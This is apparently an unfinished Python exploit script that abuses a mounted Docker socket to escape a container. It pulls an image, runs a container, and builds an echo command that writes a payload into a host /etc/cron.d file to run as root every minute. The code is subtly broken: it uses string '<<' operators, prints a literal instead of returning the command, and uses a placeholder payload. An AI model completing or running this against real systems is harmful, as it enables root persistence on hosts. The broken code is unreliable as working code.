#!/bin/python3

#Требуется установка библиотеки docker
#pip3 install docker

import os
import stat
import docker
import random
import string

def image_check(client, cont_image):
    #Image ownloading
    if len((client.images.list(cont_image))) > 0:
        print("Image exists on host")
        return 1
    else:
        print("Image doesn't exist on host. Try to download it (it may take a few seconds)...")
        try:
            client.images.pull(cont_image)
            print("Successfully download the image")
            return 1
        except:
            print("Error. Impossible to download the image")
            return 0


def make_command(mnt_path, cron_path, payload_path, payload):
    print("Creating command")
    echo_cron_path = mnt_path + cron_path
    echo_payload_path = mnt_path + payload_path
    cron_command = f"python {payload_path}"
    payload_data = rf"{payload}"
    command = f"echo \"{payload_data}\" >> {echo_payload_path} && "
    command << f"echo \"PATH=/sbin:/bin:/usr/sbin:/usr/bin:/usr/local/sbin:/usr/local/bin\" >> {echo_cron_path} && "
    command << f"echo \"\" >> {echo_cron_path} && "
    command << f"echo \"* * * * * root {cron_command}\" >> {echo_cron_path}"
    print("commmand")


def remove_container(cont):
    try:
        cont.stop()
        cont.remove()
        print("Container has been removed")
        #return 1
    except:
        print("Error. Image can't be removed")
        #return 0


def rand_str(n):
    return ''.join(random.choice(string.ascii_lowercase) for i in range(n))

def socket_sploit():
    if not(os.path.exists("/var/run/docker.sock")):
        print("Docker socket is not mounted in this container")
        return

    payload="/payload code"
    cont_image = "python:3-slim"
    client = docker.from_env()

    if not image_check(client, cont_image):
        return

    cont = client.containers.run(cont_image, "cp /var/run/docker.sock:/var/run/docker.sock", detach=True)
    print(cont.short_id)

    cron_path = '/etc/cron.d/' + rand_str(8)
    #print(crom_path)
    payload_path = '/tmp/' + rand_str(8)
    mnt_path = '/mnt/' + rand_str(8)

    remove_container(cont)

if __name__ == "__main__":
    socket_sploit()
